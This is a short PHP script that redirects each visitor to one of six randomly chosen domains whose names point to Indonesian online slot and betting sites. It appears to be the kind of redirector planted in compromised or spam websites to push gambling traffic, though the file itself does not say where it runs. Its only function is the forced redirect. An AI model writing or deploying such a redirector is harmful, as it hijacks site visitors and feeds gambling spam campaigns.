<?php
// Array of URLs to redirect to
$urls = [
    'https://sateslotgacor.xyz',
    'https://megaforwinbet.online',
    'https://nasgorbetkecap.pro',
    'https://nagaforwinapi.xyz',
    'https://bimatoto77.xyz',
    'https://burungbetsip.fun',
    // Add more URLs here
];

// Pick a random URL from the array
$random_url = $urls[array_rand($urls)];

// Redirect to the selected URL
header("Location: $random_url");
exit();
?>
